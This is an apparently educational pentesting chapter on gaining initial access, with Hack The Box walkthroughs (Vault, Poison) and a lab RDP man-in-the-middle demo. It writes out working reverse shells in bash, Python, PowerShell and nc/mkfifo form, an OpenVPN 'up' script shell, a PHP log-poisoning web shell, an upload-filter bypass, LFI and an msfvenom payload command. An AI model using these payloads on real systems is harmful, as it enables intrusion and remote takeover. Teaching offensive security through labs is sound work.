# Initial Access

> Once the phase of enumeration is completed, a path for gaining an initial foothold on the box has been found. This access may be either through remote services designed to allow users remote access or through custom exploitation via a variety of means including custom malware, remote command execution, injection and buffer overflows. We have covered some of these paths already, but we will dive deeper into some of these techniques.

## Gaining initial access

After enumerating a target, the aim is to gain access to a network through a foothold on a machine. You have already seen examples of how this can be done using reverse shells or through standard pathways for remote access such as SSH, FTP, etc. To an attacker, all access methods are not equal, and a particular path will be preferred over others depending on what the ultimate goal is. If the aim was simply to get a database of user information, then compromising a website through SQL injection and dumping the appropriate tables would be sufficient. If the aim is to gain complete control of the machine and using it as a jumping point to other machines on the network, getting command access to the box with persistence will be more important.

Ethical hackers are interested in looking at getting the maximum leverage from a machine and Hack The Box emulates this by always making the challenge about getting administrator/root access. This is not always in the form of getting a shell on a box, sometimes it is sufficient just to be able to read privileged information that only the administrator or root account would have access to. In the case of Hack The Box, this is represented by the root flag.

One way of classifying different access techniques is to split them between using legitimate external remote services and custom exploitation:

External Remote Services

* SSH
* RDP
* VNC
* Others: Citrix, FTP, TFTP, Telnet

Custom Exploitation

* Phishing with malware
* Reverse/bind shells
* Remote command execution
* Injection \(Databases and Files\)
* Buffer overflows

This is not an exhaustive classification and the main point to take from it are the different approaches. In the first class, using External Remote Services, the attacker is "living off the land" by using legitimate tools for their attack. In the second, they are crafting a custom exploitation of a vulnerability to gain unintended access.

Before we start looking at these methods of access, we need to review how Linux and Windows provide an interface to the operating system through their respective command terminals or command shells.

![Principles of a remote shell redirecting stdin, stdout and stderror over a network socket](../.gitbook/assets/0%20%282%29.png)

This entire process is made simpler through the use of a program called Netcat that can handle the IO redirection for a program over a network. In what is called a “reverse shell”, you start a Netcat session on a local machine to listen for incoming connections:

`nc -lvnp 6001`

This tells netcat to listen \(-l\) on port \(-p\) 6001 \(any number port that is not being used\) on all IP addresses for incoming connections \(-v is for verbose output, -n is for no DNS\). On the target machine, you can run:

`nc <listen machine IP> 6001 -e /bin/bash`

This will execute bash and send all IO to the listening machine.

An alternative to reverse shells are “bind shells”. In this case the process listens on the attacking machine and the attacker initiates the connection from the attacking machine. The commands are the same but reversed.

Netcat is one tool to create a reverse shell. There are numerous other ways of achieving the same result of handling the standard streams. Another common and useful way of sending a reverse shell is by using built in networking functions of bash.

`bash -i >& /dev/tcp/10.0.0.1/6001 0>&1`

Although this looks complicated, it is running a bash shell in interactive mode \(-i\) and redirecting stdout and stderr \(&gt;&\) to a socket that will connect to the address and port specified \(/dev/tcp/10.0.0.1/6001\). The final redirection command \(0&gt;&1\) redirects stdin to the same file as stdout i.e. the socket.

At the other end, you can still use Netcat in listening mode to handle the incoming connection.

There are a range of ways of running reverse shells in different languages listed on sites like PayloadsAllTheThings[\[1\]](initial-access.md). An example of a reverse shell written in Python is

```bash
python3 -c 'import socket,subprocess, os; s=socket.socket(socket.AF_INET,\
socket.SOCK_STREAM);s.connect(("10.0.0.1",6001));os.dup2(s.fileno(),0); \
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

Expanded, the code looks like this:

```python
import socket,subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",6001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

The code essentially replicates the process of making the bash socket connection you saw earlier. It creates a socket u and connects to the listener v. It redirects the stdin, stdout and stderror to the socket w and then makes then runs the bash command x. It then gets all of the standard streams using the socket and finally starts an interactive shell.

The code essentially replicates the process you saw above with the bash socket connection. It creates a socket and connects to the listener. It then gets all of the standard streams using the socket and finally starts an interactive shell.

## Reverse shells on Windows

The principles of reverse shells work with Windows as well but you don’t have the ease of having bash readily available. There are Windows' versions of Netcat and so it is possible to do a reverse shell by simply specifying cmd.exe or powershell.exe as the command to execute when using it. It is also possible, as in the Python example above, to run a reverse shell written in PowerShell as follows:

```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

When the code passed to powershell.exe's command argument \(-Command\) is expanded, it looks like this:

```python
New-Object System.Net.Sockets.TCPClient("10.0.0.1",6001)
$stream = $client.GetStream()
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
  $sendback = (iex $data 2>&1 | Out-String )
  $sendback2  = $sendback + "PS " + (pwd).Path + "> "
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
$client.Close()
```

The script creates a socket to communicate with the attacker's listener u, creates a buffer to read v from that socket which will be commands sent by the attacker w, executes the commands sent by the attacker x and gets the response and then writes the response back to the attacker y.

As with all things Windows, this is slightly more complicated than the Linux versions but functional, nonetheless. Another alternative is to use a “Meterpreter” shell that is designed to work with the pentesting framework Metasploit which you will discuss shortly.

## Upgrading Remote Shells

The shells obtained by the methods outlined sometimes are less than functional because they do not result in a full ‘TTY’ terminal. TTY stands for teletype and is derived from the early electromagnetic typewriters that were used in telegraphy and then to communicate with mainframes and minicomputers. When you open a terminal on a Mac or on Linux, the terminal software is running a pseudo teletype \(PTY\) which handles getting input from the keyboard and passing it to a TTY driver which eventually passes that data to which ever shell program you are running. The terminal handles things like arrow keys and key sequences like "control + w" which will erase a word, "control + c" which will kill the last command you ran. If you are not running a proper TTY, you won't be able to use arrow keys and "CTL+c" will kill the shell you are running and not the last command. Also using an editor like vi will be difficult.

Shells can be upgraded by using the pty library in python:

```bash
python3 -c ‘import pty;pty.spawn(“/bin/bash”);’
```

Then typing CTL+z to background the process and typing

```bash
stty raw -echo
fg
hit enter key
hit enter key
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

## SSH

Secure Shell \(SSH\) operates in a client server configuration with the server usually listening on TCP port 22. Normally, the process for a client connecting to a remote machine involves using either a password or a private key. Keys are generated using ssh-keygen which by default will use RSA as the algorithm. Running ssh-keygen will produce a private key and a public key. The public key is added to a file "authorized\_keys" normally located in the .ssh directory in the user's home directory. The private key is then held by the user on their client machine. SSH also supports password access. Although it is not normal to find a private key in the .ssh directory on the server, it is always worth checking, using the default filename for the private key "id\_rsa".

As an added layer of protection, SSH private keys can be encrypted. John The Ripper will extract a hash from the encrypted SSH key with a program called "sshng2john.py".

Another useful utility supported by SSH is "scp" a ssh file copying utility. To copy a file to a remote machine you can use the command:

```bash
scp -I remote.key localfile.txt user@remote.com:/tmp/remotefile.txt
```

To copy the remote file to a local file, you just reverse the order of the file paths.

### SSH Tunnels

SSH can be used to create an encrypted tunnel that supports port forwarding. There are two types of port forwarding, local and remote. This can be confusing because local forwarding forwards packets from a local port to a port on a remote machine. Remote port forwarding is the opposite, taking packets for a port on a remote machine and forwarding them to a port on the local machine. As an example, let us imagine that you have ssh'd onto a remote machine that is behind a firewall that doesn't allow any traffic out. You would like to access a web server on our local machine to be able to access file from the remote box. To do this, you could use an SSH tunnel as:

```bash
ssh -R 8000:127.0.0.1:8000 user@remoteserver.htb
```

From the remote machine, you can now access the web server on the local machine by using the URL [http://127.0.0.1:8000](http://127.0.0.1:8000). Of course, you would need to make sure that nothing was running on port 8000 already on the remote machine.

The converse of this is where you would like to access a port on a remote machine that is only available from that machine. In this case, you use SSH in the same was as before but using the -L flag instead of -R.

```bash
ssh -L 8000:127.0.0.1:8000 user@remoteserver.htb
```

From the local machine, you can access the remote server by once again using the URL [http://127.0.0.1:8000](http://127.0.0.1:8000).

A tunnel can be created without actually logging into the machine \(i.e. not running a shell\) by specifying the -N flag.

#### Dynamic Port Forwarding

Specifying individual ports to forward works well when you are interested in a specific target for this. There are situations however when there is more than one port that you would like to forward, or indeed a range of ports. To do this you can use dynamic port forwarding which works as a SOCKS proxy.

```bash
ssh -D 1080 user@remoteserver.htb
```

Once this is running, a SOCKS proxy can be configured in settings of the browser, or you can use the application proxychains which allows any application that uses the network to send its commands over the SOCKS proxy you have established. For example, to curl a web server running on the remote host on port 8000, you would use proxychains as:

```bash
proxychains curl http://remoteserver.htb:8000
```

Depending on the tool however, there is often built in support for proxying and so with curl for example, the SOCKs proxy can be specified directly:

```bash
curl socks5h://localhost:1080 http://remoteserver.htb:8000
```

## Exercise: Initial access and port forwarding on Hack the Box machine Vault

This machine was graded medium difficulty and was actually 3 separate virtual machines with hostnames: ubuntu, DNS and Vault. Although you will be dealing with pivoting later on, solving the machine required the use of local and remote port forwarding over SSH. An additional complication was the presence of a firewall that was blocking traffic to the Vault machine unless the source port was set to 53, the port usually associated with DNS. The firewall can be circumvented in a number of ways but the easiest is to use Ipv6 which hadn't been blocked by the firewall.

An nmap scan of the machine reveals SSH running on port 22 and HTTP running on port 80:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Vault]
└──╼ $sudo nmap -v -sC -sV --min-rate=1000 -T4 -p- vault.htb \
-oN Nmap/tcp-full
<SNIP>
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
<SNIP>
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
<SNIP>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visiting the website on port 80, you get the text:

```bash
Welcome to the Slowdaddy web interface
```

We specialize in providing finanancial organisations with strong web and database solutions and we promise to keep your customers financial data safe.

We are proud to announce our first client: Sparklays \(Sparklays.com still under construction\)

Running Gobuster, but with a modified wordlist to add "sparklays" and "Sparklays", you find the sub-directory "sparklays". Running gobuster on this directory reveals the following sub-directories and files:

```bash
┌─[rin@parrot]─[~/boxes/Vault]
└──╼ $gobuster dir -t 50 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-u http://vault.htb/sparklays -x .php
<SNIP>
/login.php (Status: 200)
/admin.php (Status: 200)
/design (Status: 301)
```

And again, within the /design sub-directory, you find an additional directory /design/uploads. Navigating to the [http://vault.htb/sparklays/admin.php](http://vault.htb/sparklays/admin.php) returns a login page which doesn't return any errors or other feedback when testing out default username/password combinations like admin/admin. Putting this request into Burp Suite and changing the host header in the request to "localhost" however, you get redirected to another php page " sparklays-local-admin-interface-0001.php" which presents the page shown in Figure 3-2.

![Vault admin panel](../.gitbook/assets/vault.png)

Clicking on "Server Settings" leads to a page under construction. "Design Settings" however, returns a page that allows the logo to be changed. We can upload a PHP file that will give us a reverse shell. There are webshells already installed on Parrot Sec OS located in the directory /usr/share/webshells. We will use the PHP one:

```bash
/usr/share/webshells/php/php-reverse-shell.php
```

Copying this file to our working directory and renaming it reverse.php, we can try and upload it using the logo upload feature. The upload function restricts the file types that can be uploaded and so if you try and upload the PHP file you get an error returned saying "sorry that file type is not allowed". However, if you change the extension of the file to another valid PHP extension "reverse.php5", that is allowed. Start a Netcat listener to catch the reverse shell:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Vault]
└──╼ $nc -lvnp 6001
listening on [any] 6001 ...
```

We can now navigate to the URL:

```bash
http://vault.htb/sparklays/design/uploads/reverse.php5
```

This then returns a reverse shell which you can upgrade to a full TTY using the Python and bash commands:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTL-Z
bg
stty raw -echo
fg
fg
```

We now have initial access as the user www-data. Exploring the /home directories, you see two users; "alex" and "dave". On exploring the "dave" directory, you find a sub-directory "Desktop" that has files which contain ssh credentials for the user "dave":

```bash
www-data@ubuntu:/home/dave/Desktop$ ls -al
total 20
drwxr-xr-x 2 dave dave 4096 Sep 3 2018 .
drwxr-xr-x 18 dave dave 4096 Sep 3 2018 ..
-rw-rw-r-- 1 alex alex 74 Jul 17 2018 Servers
-rw-rw-r-- 1 alex alex 14 Jul 17 2018 key
-rw-rw-r-- 1 alex alex 20 Jul 17 2018 ssh
www-data@ubuntu:/home/dave/Desktop$ cat Servers
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x
www-data@ubuntu:/home/dave/Desktop$ cat key
itscominghome
www-data@ubuntu:/home/dave/Desktop$ cat ssh
dave
Dav3therav3123
www-data@ubuntu:/home/dave/Desktop$
```

We can now login using ssh and the user dave and the password Dav3therav3123.

In the file Servers, it mentioned another machine at the IP address "192.168.122.4". you can see from using the command "ifconfig" that the machine vault has 2 network interfaces with the interface "virbr0" having the IP address 192.168.122.1. you can check what ports might be on the machine with the IP address "192.168.122.4 by using Netcat:

```bash
nc -vz 192.168.122.4 1-100
```

The -v flag allows for verbose output and the -z flag does not connect to the port, it just checks if it could connect. Using this, you see that ports 22 and 80 are open.

We can now do a local port forward to get access to port 80 on the box 192.168.122.4

```bash
┌─[rin@parrot]─[~/boxes/Vault]
└──╼ $ssh -N -L 8081:192.168.122.4:80 dave@vault.htb
dave@vault.htb's password:
```

This then allows us to navigate to the web site at [http://127.0.0.1:8081](http://127.0.0.1:8081) where you get links related to DNS and VPN configuration \(Figure 3-4\).

![Home page on port 8081](../.gitbook/assets/vault2.png)

The first link goes to a page under construction. The second is a page that allows for openvpn configurations to be tested.

![VPN Configurator page](../.gitbook/assets/vault3.png)

Searching for OpenVPN configuration exploits, you find a blog post by Jacob Baines[\[2\]](initial-access.md) which gives a configuration for returning a reverse shell. Adapting this, you can paste the following into the page, update the file and then click Test VPN.

```bash
Remote 192.168.122.1
nobind
dev tun
script-security 2
up ​"/bin/bash -c '/bin/bash -I > /dev/tcp/192.168.122.1/6002 0<&1 2>&1&'"
```

Rather than run the Netcat listener on the Vault machine however, you can use another SSH remote port forwarder to tunnel the shell back to our local machine. To do this from an existing SSH session, you can use the special characters **~C** at the beginning of the command prompt to drop into an SSH prompt and then set up the remote port forward:

```bash
dave@ubuntu:~$
ssh> -R 6002:127.0.0.1:6002
Forwarding port.
dave@ubuntu:~$
```

Setting up the listener on the local machine will then give us a reverse shell on the DNS machine as root.

```bash
┌─[rin@parrot]─[~/boxes/Vault]
└──╼ $nc -lvnp 6002
listening on [any] 6002 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56806
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html#
```

Looking around the box, you find that the ssh file in /home/dave has a password dav3gerous567.

Looking at the /etc/hosts file, you see an entry for the vault machine:

```bash
root@DNS:/home/dave# cat /etc/hosts
cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 DNS
192.168.5.2 Vault
# The following lines are desirable for Ipv6 capable hosts
::1 localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

The machine doesn’t respond to a ping but using nmap on the Vault machine, you find two ports that are closed:

```bash
PORT STATE SERVICE
53/tcp closed domain
4444/tcp closed krb524
```

There is a possibility that this response is just poor firewall design and that the reason that 53 responded as closed was because the firewall may be letting anything that looks like DNS traffic through to the box. You can re-run nmap but specify the source port as 53. This gives an open port 987

```bash
PORT STATE SERVICE
987/tcp open unknown
```

Running netcat to connect to that port returns and SSH banner suggesting that you can SSH onto that box.

```bash
root@DNS:/home/dave# nc -p 53 Vault 987
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

There are a couple of ways of getting around the firewall restriction to get to the Vault machine. The easiest however is to use Ipv6. In order to do that, you need to find the Ipv6 address of Vault. If you ping the Ipv6 broadcast address, the ping will go to all hosts on the network connected to the "ens3" network interface:

```bash
root@DNS:/home/dave# ping6 -I ens3 ff02::1
PING ff02::1(ff02::1) from fe80::5054:ff:fe17:ab49 ens3: 56 data bytes
64 bytes from fe80::5054:ff:fe17:ab49: icmp_seq=1 ttl=64 time=0.026 ms
64 bytes from fe80::5054:ff:fec6:7066: icmp_seq=1 ttl=64 time=2.48 ms (DUP!)
64 bytes from fe80::5054:ff:fe3a:3bd5: icmp_seq=1 ttl=64 time=2.49 ms (DUP!)
64 bytes from fe80::5054:ff:fee1:7441: icmp_seq=1 ttl=64 time=3.03 ms (DUP!)
```

From this, you get 4 responses. The first response from fe80::5054:ff:fe17:ab49 you know is from the DNS machine as you can see its Ipv6 address using the ifconfig command. Using the nmap command, you can check which machine has port 987 open and you find that it is the machine with the Ipv6 address fe80::5054:ff:fec6:7066.

We can then just ssh in using the ssh command:

```bash
ssh -p 987 dave@fe80::5054:ff:fec6:7066%ens3
```

Once on the box, you can see the root flag that is encrypted using GPG. You can use the gpg application to get more information about the file and find that it has been encrypted using an RSA key with the ID D1EB1F03.

```bash
dave@vault:~$ ls
root.txt.gpg
dave@vault:~$ gpg root.txt.gpg
gpg: directory `/home/dave/.gnupg' created
gpg: new configuration file `/home/dave/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/dave/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/dave/.gnupg/secring.gpg' created
gpg: keyring `/home/dave/.gnupg/pubring.gpg' created
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available
```

This key doesn't exist on the Vault machine but does on the ubuntu machine:

```bash
dave@ubuntu:~$ gpg --list-keys
/home/dave/.gnupg/pubring.gpg
pub 4096R/0FDFBFE4 2018-07-24
uid avid <dave@david.com>
sub 4096R/D1EB1F03 2018-07-24
```

We can use scp \(SSH copy utility\) to copy the file onto the DNS box and then onto the ubuntu machine and decrypt using gpg and the passphrase "itscominghome" that you found in the file called Key earlier.

## Remote Desktop Protocol

Remote Desktop Protocol \(RDP\) allows user to access their desktop from another machine over a network using the RDP client. The RDP server listens on TCP and UDP port 3389 by default. Users are permitted to use RDP are those in the Remote Desktop Users group. RDP access is one way hackers will gain initial access to a machine if they have a user's credentials. It can also be used to establish persistence, i.e. an easy way to regain access at some later point. In this case, a new user can be created and added to the relevant groups to allow remote desktop access.

RDP is also susceptible to man-in-the-middle attacks. Using software such as Seth[\[3\]](initial-access.md). When Remote Desktop Connection connects through to a machine, it will throw up an error if there is a problem with the TLS certificate. However, it does this with the default self-signed certificate and users are normally used to just ignoring the warning and clicking through. Another issue with man-in-the-middle is if RDP is configured to use Network Level Authentication which Seth is not able to handle. In this scenario, Seth will still be able to capture the plaintext password that was entered into the login screen for the RDP connection, but the connection will then die.

There have been a number of exploits of RDP with the most significant recent exploit being BlueKeep \(CVE-2019-0708\) which allowed remote code execution through RDP on Windows 7 and Windows Server 2008 machines.

RDP does not feature in Hack The Box machines, mainly because in the past, it would have been hard to support the many users accessing RDP all at the same time on a VM. However, this is an important technique in an attacker's arsenal and so MITRE for example lists numerous malicious hacker groups as using it to gain access and for lateral movement [\[4\]](initial-access.md).

### Exercise: Using Seth in a Man-in-the-Middle Attack

Hack The Box doesn't have any good examples of RDP exploitation and so to illustrate at least one vulnerability, you will demonstrate how easy it is to get a person's password using Seth.

For this demonstration, you have a Windows 10 box that is configured to accept remote desktop connections as the target. You can use your Windows 10 Commando box if you have set that up. The victim is a remote desktop connection client from any other machine on the network, including the computer you are using to run the VMs on. The attacker machine is our ParrotSec VM. The network is shown in Figure 3-6 below.

![Network diagram of RDP man-in-the-middle attack](../.gitbook/assets/sethnetworkdiag.png)

When you run Seth on the attacker machine and then try and connect using the Remote Desktop Client, you get this output:

```bash
┌─[rin@parrot]─[/opt/Seth]
└──╼ $sudo ./seth.sh eth0 10.0.1.7 10.0.1.5 10.0.1.8
███████╗███████╗████████╗██╗  ██╗
██╔════╝██╔════╝╚══██╔══╝██║  ██║ by Adrian Vollmer
███████╗█████╗     ██║   ███████║ seth@vollmer.syss.de
╚════██║██╔══╝     ██║   ██╔══██║ SySS GmbH, 2017
███████║███████╗   ██║   ██║  ██║ https://www.syss.de
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
[*] Linux OS detected, using iptables as the netfilter interpreter
[*] Spoofing arp replies...
[*] Turning on IP forwarding...
[*] Set iptables rules for SYN packets...
[*] Waiting for a SYN packet to the original destination...
[+] Got it! Original destination is 10.0.1.27
[*] Clone the x509 certificate of the original destination...
[*] Adjust iptables rules for all packets...
[*] Run RDP proxy...
Listening for new connection
Connection received from 10.0.1.5:61220
Warning: RC4 not available on client, attack might not work
Downgrading authentication options from 11 to 3
Listening for new connection
Enable SSL
Connection received from 10.0.1.5:61232
Warning: RC4 not available on client, attack might not work
Downgrading authentication options from 11 to 3
Listening for new connection
Enable SSL
Failed to extract keyboard layout information
rin:::afb99ab9d701d668:9511818e381cab338594796e923386ef:
010100000000000007cbbd3eb4b8d601699b03023078129f00000000
02001e004400450053004b50000bf00510001001e004400450053004
b3344550004001e004400450053004b0054004f0050002d004900520
052004b0044004e00510003001e004400450053004b0054004f00500
02d004900520052004b0044004e0051000700080007cbbd3eb4b8d60
106000cd00020000000000000000000000
Tamper with NTLM response
Downgrading CredSSP
Connection received from 10.0.1.5:61233
Warning: RC4 not available on client, attack might not work
Listening for new connection
Server enforces NLA; switching to 'fake server' mode
Enable SSL
Connection lost on enableSSL: [Errno 104] Connection reset by peer
Hiding forged protocol request from client
.\rin:S3cr3tP@55w0rd
[*]
```

In this scenario, Network Level Authentication had been configured and so Seth was not able to complete the attack and the connection fails with an error. However, the plaintext username and password are still obtained by the attacker. If the NLA requirement option is switched off, the connection completes, and the user would not be any the wiser.

### VNC

VNC is an alternative to RDP that is platform independent. VNC uses the Remote Frame Buffer protocol \(RFB\). It is usually configured to run on ports 5900+N were N is the display number. Whilst RFB is not a secure protocol, VNC can be run through an SSH or VPN tunnel making it secure.

VNC hasn't been the most robust of products and there are numerous serious vulnerabilities in a range of different versions of the product.

VNC may require password but if used, it doesn't need a username. Metasploit has a VNC login brute force module \(auxiliary/scanner/vnc/vnc\_login\) and the command line application hydra can also brute force VNC passwords. A VNC-enabled payload can be created by msfvenom also:

msfvenom -p windows/vncinject/reverse\_tcp LHOST=&lt;Local Host IP address&gt; LPORT=4444 -f exe &gt; payload.exe

Finally, meterpreter can launch a VNC session by running "run vnc" within a meterpreter session.

### Exercise: Exploiting VNC for initial access in Hack The Box machine Poison

An nmap scan shows that this machine is running FreeBSD and has port 22 \(SSH\) and port 80 \(HTTP\) open.

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Poison]
└──╼ $sudo nmap -v -sC -sV -T4 --min-rate 1000 -p- poison.htb -oA nmap/full-tcp
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
<SNIP>
80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

Navigating to the website, there is a home page suggesting that various PHP files can be tested \(Figure 4-6\).

![Home page of Poison machine](../.gitbook/assets/poison1.png)

Inputting one of the filenames listed results in the contents of that file being listed. If we enter listfiles.php, the output is:

```php
Array ( [0] => . [1] => .. [2] => browse.php [3] => 
index.php [4] => info.php [5] => ini.php [6] => 
listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )
```

The PHP code is creating an array of filenames. The interesting one is pwdbackup.txt which if we access has the contents:

```bash
This password is secure, it's encoded atleast 13 times.. what could go 
wrong really..
Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS…
<SNIP>
```

The encoding format looks like Base64 and so if we simply put the string in a file and decode it13 times we get a password:

```bash
┌─[rin@parrot]─[~/boxes/Poison]
└──╼ $cat password.txt | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d| base64 -d| base64 -d
Charix!2#4%6&8(0
```

Going back to the home page, the input to the text box is simply being passed as a parameter called "file" to be displayed:

```bash
http://poison.htb/browse.php?file=listfiles.php
```

This looks like a candidate for local file inclusion \(LFI\) by tampering with the file parameter. If we try the URL

```bash
http://poison.htb/browse.php?file=/etc/passwd
```

We get the contents of the passwd file returned.

```bash
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
<SNIP>
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

We can see from the passwd file that there is a user "charix" and using the password we discovered earlier with this, we can SSH into the machine.

This was not the only way that you can gain initial access to the box however. Another way of gaining access is to use a technique called "log poisoning" which involves putting PHP code into the Apache log file that records requests to the site. This log records the URL requested, the protocol, the status code and also the user agent which is the details of the browser client used to make the request. If we put executable PHP into the User Agent header filed in the request and make a request, the next time we use LFI on the log, that code will be executed. The code we can add to the User Agent field is:

```php
<?php system($_GET['c']); ?>
```

This code takes the value in the query parameter 'c' and executes it using the 'system' command. To add the code to the User Agent field, we can use Burp to intercept the request and then change the value in the Repeater tab before sending it to the server:

```bash
GET /browse.php?file=/etc/passwd HTTP/1.1
Host: poison.htb
User-Agent: <?php system($_GET['c']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

We can test this now by sending a new request to view the log file and pass a command via the parameter 'c':

```bash
GET /browse.php?file=/var/log/httpd-access.log&c=id HTTP/1.1
```

This will return the contents of the log file and the final line will be:

```bash
10.10.14.135 - - [] "GET /browse.php?file=/etc/passwd HTTP/1.1" 200 1894 \
"-" "uid=80(www) gid=80(www) groups=80(www)"
```

It took the 'id' command and executed it to return the details of the user 'www'.

We can now execute a reverse shell. Start a Netcat listener on your machine:

```bash
┌─[rin@parrot]─[~/boxes/Poison]
└──╼ $nc -lvnp 6001
listening on [any] 6001 ...
```

We can now poison the log with PHP reverse shell code:

```php
<?php exec('
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.135 6001 >/tmp/f') 
?>
```

When we make the GET request to view the log, we will get a reverse shell:

```bash
┌─[rin@parrot]─[~/boxes/Poison]
└──╼ $nc -lvnp 6001
listening on [any] 6001 ...
connect to [10.10.14.135] from (UNKNOWN) [10.129.105.0] 35870
sh: can't access tty; job control turned off
$ whoami
www
```

The shell isn't great and Python is not on the box to use to upgrade it. If you had got access this way, it would have ben to explore the box to find the pwdbackup.txt file and from there the password for the charix user to enable the use of SSH.

Once SSH'd onto the machine, you discover a file secret.zip which you can copy back to your local host using the scp command:

```bash
┌─[rin@parrot]─[~/boxes/Poison]
└──╼ $scp charix@poison.htb:/home/charix/secret.zip .
Password for charix@Poison:
secret.zip 100% 166 0.5KB/s 00:00
```

The file can be unzipped using charix's password to reveal the secret file which has binary data in it but otherwise it is not clear what it is for.

Back to enumeration. Looking at the processes running, you will notice a process Xvnc:

```bash
charix@Poison:~ % ps -aux
USER PID %CPU %MEM VSZ RSS TT STAT STARTED TIME COMMAND
root 11 100.0 0.0 0 16 - RL 14:00 30:53.63 [idle]
root 0 0.0 0.0 0 160 - DLs 14:00 0:00.01 [kernel]
root 1 0.0 0.1 5408 976 - ILs 14:00 0:00.01 /sbin/init --
root 2 0.0 0.0 0 16 - DL 14:00 0:00.00 [crypto]
<SNIP>
root 614 0.0 0.9 23620 8868 v0- I 14:00 0:00.04 Xvnc :1 -desktop X 
    -httpd /usr/local/share/tight
root 625 0.0 0.7 67220 7048 v0- I 14:00 0:00.03 xterm -geometry 80x24+10+10 
    -ls -title X Desktop
root 626 0.0 0.5 37620 5312 v0- I 14:00 0:00.01 twm
```

To get more information, we can display the process information in more detail:

```bash
charix@Poison~ % ps -auxww | grep vnc
root 614 0.0 0.9 23620 8868 v0- I 14:00 0:00.04 Xvnc :1 -desktop X 
  -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority 
  -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd 
  -rfbport 5901 -localhost -nolisten tcp :1
```

From this, we know that TightVNC is running as user root and this is listening on port 5901 on localhost. To access the VNC server, you first set up a tunnel using:

```bash
charix@Poison:~ %
ssh> -D 1080
Forwarding port.
```

On our local box, you can confirm that you can access this port by using:

```bash
┌─[rin@parrot]─[~/boxes/Poison]
└──╼ $proxychains curl --http0.9 http://127.0.0.1:5901

ProxyChains-3.1 (http://proxychains.sf.net) |S-chain|
  -<>-127.0.0.1:1080-<><>-127.0.0.1:5901-<><>-OK RFB 003.008
```

Note that you used proxychains here to access the VNC server. You could have used the --socks5 argument to curl as well.

We can then run vncviewer using proxychains. This asks for a password and so trying the "secret" file that you got from unzipping "secret.zip" from charix's home directory:

```bash
┌─[✗]─[rin@parrot]─[~/boxes/Poison]
└──╼ $proxychains vncviewer -passwd secret 127.0.0.1:5901
ProxyChains-3.1 (http://proxychains.sf.net) |S-chain|
